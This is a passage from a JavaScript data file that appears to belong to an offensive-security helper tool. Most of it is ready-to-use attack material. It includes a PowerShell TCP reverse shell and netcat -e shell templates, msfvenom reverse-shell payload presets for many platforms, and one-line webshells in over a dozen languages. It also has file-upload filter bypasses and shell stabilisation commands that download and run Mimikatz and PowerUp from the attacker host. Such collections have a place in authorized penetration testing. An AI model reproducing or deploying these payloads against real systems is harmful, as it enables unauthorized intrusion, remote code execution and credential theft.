        victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \' ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
    },
    netcat: {
        label: 'Netcat (with -e)',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'nc {{LHOST}} {{LPORT}} -e /bin/bash'
    }
};

const MSFVENOM_TEMPLATES = [
    // Windows Payloads
    {
        key: 'windows_meterpreter',
        label: 'Windows x64 Meterpreter (exe)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_meterpreter_https',
        label: 'Windows x64 Meterpreter HTTPS (exe)',
        payload: 'windows/x64/meterpreter/reverse_https',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_shell',
        label: 'Windows x64 Shell (exe)',
        payload: 'windows/x64/shell_reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_x86_meterpreter',
        label: 'Windows x86 Meterpreter (exe)',
        payload: 'windows/meterpreter/reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_powershell',
        label: 'Windows PowerShell (cmd)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'psh-cmd',
        extension: 'bat',
        defaultName: 'payload'
    },
    {
        key: 'windows_dll',
        label: 'Windows x64 Meterpreter (dll)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'dll',
        extension: 'dll',
        defaultName: 'payload'
    },

    // Linux Payloads
    {
        key: 'linux_x64',
        label: 'Linux x64 Shell (elf)',
        payload: 'linux/x64/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_x86',
        label: 'Linux x86 Shell (elf)',
        payload: 'linux/x86/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_x64_meterpreter',
        label: 'Linux x64 Meterpreter (elf)',
        payload: 'linux/x64/meterpreter/reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_armle',
        label: 'Linux ARM Shell (elf)',
        payload: 'linux/armle/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },

    // macOS Payloads
    {
        key: 'macos',
        label: 'macOS x64 Shell (macho)',
        payload: 'osx/x64/shell_reverse_tcp',
        format: 'macho',
        extension: 'macho',
        defaultName: 'payload'
    },
    {
        key: 'macos_meterpreter',
        label: 'macOS x64 Meterpreter (macho)',
        payload: 'osx/x64/meterpreter/reverse_tcp',
        format: 'macho',
        extension: 'macho',
        defaultName: 'payload'
    },

    // Web Payloads
    {
        key: 'php',
        label: 'PHP Reverse TCP (raw)',
        payload: 'php/reverse_php',
        format: 'raw',
        extension: 'php',
        defaultName: 'payload'
    },
    {
        key: 'php_meterpreter',
        label: 'PHP Meterpreter (raw)',
        payload: 'php/meterpreter/reverse_tcp',
        format: 'raw',
        extension: 'php',
        defaultName: 'payload'
    },
    {
        key: 'jsp',
        label: 'JSP Shell (raw)',
        payload: 'java/jsp_shell_reverse_tcp',
        format: 'raw',
        extension: 'jsp',
        defaultName: 'payload'
    },
    {
        key: 'asp',
        label: 'ASP Shell (asp)',
        payload: 'windows/shell/reverse_tcp',
        format: 'asp',
        extension: 'asp',
        defaultName: 'payload'
    },
    {
        key: 'aspx',
        label: 'ASPX Shell (aspx)',
        payload: 'windows/shell/reverse_tcp',
        format: 'aspx',
        extension: 'aspx',
        defaultName: 'payload'
    },
    {
        key: 'python',
        label: 'Python Shell (raw)',
        payload: 'python/shell_reverse_tcp',
        format: 'raw',
        extension: 'py',
        defaultName: 'payload'
    },
    {
        key: 'nodejs',
        label: 'Node.js Shell (raw)',
        payload: 'nodejs/shell_reverse_tcp',
        format: 'raw',
        extension: 'js',
        defaultName: 'payload'
    },

    // Android
    {
        key: 'android',
        label: 'Android Meterpreter (apk)',
        payload: 'android/meterpreter/reverse_tcp',
        format: 'apk',
        extension: 'apk',
        defaultName: 'payload'
    },

    // Java
    {
        key: 'java_jar',
        label: 'Java Shell (jar)',
        payload: 'java/shell_reverse_tcp',
        format: 'jar',
        extension: 'jar',
        defaultName: 'payload'
    },
    {
        key: 'java_war',
        label: 'Java Shell (war)',
        payload: 'java/shell_reverse_tcp',
        format: 'war',
        extension: 'war',
        defaultName: 'payload'
    },

    // Shellcode formats
    {
        key: 'shellcode_c',
        label: 'Shellcode (C format)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'c',
        extension: 'c',
        defaultName: 'shellcode'
    },
    {
        key: 'shellcode_python',
        label: 'Shellcode (Python format)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'python',
        extension: 'py',
        defaultName: 'shellcode'
    },
    {
        key: 'shellcode_raw',
        label: 'Shellcode (Raw)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'raw',
        extension: 'bin',
        defaultName: 'shellcode'
    }
];

const SHELL_LIBRARY = [
    {
    id: 'webshells',
    title: 'Single-line webshells',
    entries: [
        {
            name: 'PHP',
            commands: [
                '<?php system($_GET[\'cmd\']); ?>',
                '<?php echo passthru($_GET[\'cmd\']); ?>',
                '<?php echo shell_exec($_GET[\'cmd\']); ?>',
                '<?php echo exec($_GET[\'cmd\']); ?>',
                '<?php echo `$_GET[\'cmd\']`; ?>',
                '<?php eval($_POST[\'cmd\']); ?>',
                '<?php @eval($_REQUEST[\'cmd\']); ?>',
                '<?php echo file_get_contents(\'/etc/passwd\'); ?>',
                '<?=`$_GET[0]`?>',
                '<?=$_GET[0]($_GET[1]);?>'
            ]
        },
        {
            name: 'ASP',
            commands: [
                '<% eval request("cmd") %>',
                '<% execute request("cmd") %>',
                '<% response.write(eval(request("cmd"))) %>'
            ]
        },
        {
            name: 'ASPX',
            commands: [
                '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]).Start());%>',
                '<%@ Page Language="VB" %><%CreateObject("WScript.Shell").Run(Request("cmd"))%>',
                '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>'
            ]
        },
        {
            name: 'JSP',
            commands: [
                '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                '<%@ page import="java.io.*" %><%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                '<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os=p.getOutputStream();InputStream in=p.getInputStream();DataInputStream dis=new DataInputStream(in);String disr=dis.readLine();while(disr!=null){out.println(disr);disr=dis.readLine();}%>'
            ]
        },
        {
            name: 'Python (Flask)',
            commands: [
                'from flask import Flask, request; import os; app = Flask(__name__); @app.route("/") def cmd(): return os.popen(request.args.get("cmd")).read(); app.run(host="0.0.0.0", port=8080)',
                'from flask import Flask, request; import subprocess; app = Flask(__name__); @app.route("/") def shell(): return subprocess.check_output(request.args.get("cmd"), shell=True).decode(); app.run(host="0.0.0.0")'
            ]
        },
        {
            name: 'Python (Django)',
            commands: [
                'import os; from django.http import HttpResponse; def shell(request): return HttpResponse(os.popen(request.GET.get("cmd")).read())'
            ]
        },
        {
            name: 'Python (Generic)',
            commands: [
                'import os; os.system("busybox nc <LHOST> <LPORT> -e bash")',
                'import subprocess; subprocess.call(["nc", "<LHOST>", "<LPORT>", "-e", "/bin/bash"])',
                '__import__("os").system("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")'
            ]
        },
        {
            name: 'Node.js (Express)',
            commands: [
                'const express = require("express"); const { exec } = require("child_process"); const app = express(); app.get("/", (req, res) => { exec(req.query.cmd, (err, stdout) => { res.send(stdout); }); }); app.listen(8080);',
                'require("http").createServer((req,res)=>{require("child_process").exec(new URL(req.url,"http://localhost").searchParams.get("cmd"),(e,s)=>{res.end(s)})}).listen(8080)'
            ]
        },
        {
            name: 'Perl',
            commands: [
                'use CGI qw(:standard); print header; print `$ENV{QUERY_STRING}`;',
                '#!/usr/bin/perl\nuse CGI; $q = CGI->new; print $q->header; print `@{[$q->param("cmd")]}`;'
            ]
        },
        {
            name: 'Ruby',
            commands: [
                'require "sinatra"; get "/" do; `#{params[:cmd]}`; end',
                '<% require "open3"; stdout, stderr, status = Open3.capture3(params[:cmd]); %><%= stdout %>'
            ]
        },
        {
            name: 'Go',
            commands: [
                'package main; import ("net/http"; "os/exec"; "io"); func main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { cmd := exec.Command("sh", "-c", r.URL.Query().Get("cmd")); out, _ := cmd.Output(); io.WriteString(w, string(out)) }); http.ListenAndServe(":8080", nil) }'
            ]
        },
        {
            name: 'CFML (ColdFusion)',
            commands: [
                '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output"></cfexecute><cfoutput>#output#</cfoutput>',
                '<cfexecute name="/bin/bash" arguments="-c #url.cmd#" variable="result"></cfexecute><cfoutput>#result#</cfoutput>'
            ]
        },
        {
            name: 'Lua',
            commands: [
                'os.execute(ngx.var.arg_cmd)',
                'local handle = io.popen(ngx.var.arg_cmd); local result = handle:read("*a"); handle:close(); ngx.say(result)'
            ]
        },
        {
            name: 'Bash (CGI)',
            commands: [
                '#!/bin/bash\necho "Content-type: text/html"\necho ""\neval $QUERY_STRING'
            ]
        },
        {
            name: 'PowerShell (IIS)',
            commands: [
                '<% @ Page Language="PowerShell" %><%Invoke-Expression $Request.QueryString["cmd"]%>'
            ]
        }
    ]
},
    {
        id: 'upload-bypass',
        title: 'Upload bypass',
        entries: [
            {
                name: 'Alternative extensions',
                description: 'Use these extensions when filters block the obvious one.',
                table: {
                    headers: ['Platform', 'Extensions'],
                    rows: [
                        ['PHP', '.php, .php2, .php3, .php4, .php5, .php6, .php7, .php16, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar, .inc, .hphp, .ctp, .module'],
                        ['PHP8', '.php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp'],
                        ['ASP/ASPX', '.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml'],
                        ['PERL', '.pl, .pm, .cgi, .lib'],
                        ['JSP', '.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action'],
                        ['Coldfusion', '.cfm, .cfml, .cfc, .dbm'],
                        ['Flash', '.swf'],
                        ['Erlang Yaws', '.yaws']
                    ]
                }
            },
            {
                name: 'Content-Type tricks',
                description: 'Upload then rewrite the header to an allowed MIME type while keeping code in body.',
                table: {
                    headers: ['Use case', 'Content-Type to try'],
                    rows: [
                        ['Images allowed', 'image/jpeg, image/png, image/gif'],
                        ['Documents allowed', 'application/pdf, application/msword, application/vnd.ms-excel'],
                        ['Generic binary', 'application/octet-stream']
                    ]
                }
            },
            {
                name: 'Magic numbers',
                description: 'Embed a valid header before your payload.',
                table: {
                    headers: ['Format', 'Command to prepend magic'],
                    rows: [
                        ['GIF', 'printf \'GIF89a;<?php system($_GET["cmd"]); ?>\' > shell.gif'],
                        ['JPEG', 'printf "\\xff\\xd8\\xff\\xe0<?php system(\'id\'); ?>" > image?jpg'],
                        ['Exif comment', 'exiftool -Comment=\'<?php echo "<pre>"; system($_GET["cmd"]); ?>\' image.jpg']
                    ]
                }
            }
        ]
    },
    {
        id: 'stabilisation',
        title: 'Shell stabilisation',
        entries: [
            {
                name: 'Linux Shell Stabilization',
                codeBlocks: [
                    {
                        label: '',
                        code: [
                            '# Spawn PTY with Python',
                            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                            '',
                            '# Upgrade to full TTY',
                            '# Step 1: Background shell with Ctrl+Z',
                            '# Step 2: Configure terminal',
                            'stty raw -echo',
                            '# Step 3: Bring shell to foreground',
                            'fg',
                            '# Step 4: Set terminal type',
                            'export TERM=xterm-256color',
                            '',
                            '# Alternative methods',
                            '# Using script',
                            'script -qc /bin/bash /dev/null',
                            '',
                            '# Using socat (on attacker machine)',
                            'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>',
                            '# On victim',
                            'socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
                            '',
                            '# Fix terminal size',
                            'stty rows 50 cols 200'
                        ]
                    }
                ]
            },
            {
                name: 'Windows Shell Stabilization',
                codeBlocks: [
                    {
                        label: '',
                        code: [
                            '# PowerShell stabilization',
                            'powershell -nop -exec bypass',
                            '',
                            '# Load PowerSploit modules',
                            'IEX (New-Object Net.WebClient).DownloadString(\'http://<LHOST>/PowerUp.ps1\')',
                            'IEX (New-Object Net.WebClient).DownloadString(\'http://<LHOST>/Invoke-Mimikatz.ps1\')',
                            '',
                            '# RDP enable (if admin)',
                            'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                            'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                            '',
                            '# Check for WinRM',
                            'Get-Service WinRM',
                            'Enable-PSRemoting -Force'
                        ]
                    }
                ]
            }
        ]
    }
];

function escapeRegex(value) {
    return value.replace(/[.*+?^${}()|[\\]\\]/g, '\\$&');
}

function escapeHtml(value) {
    return `${value}`
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
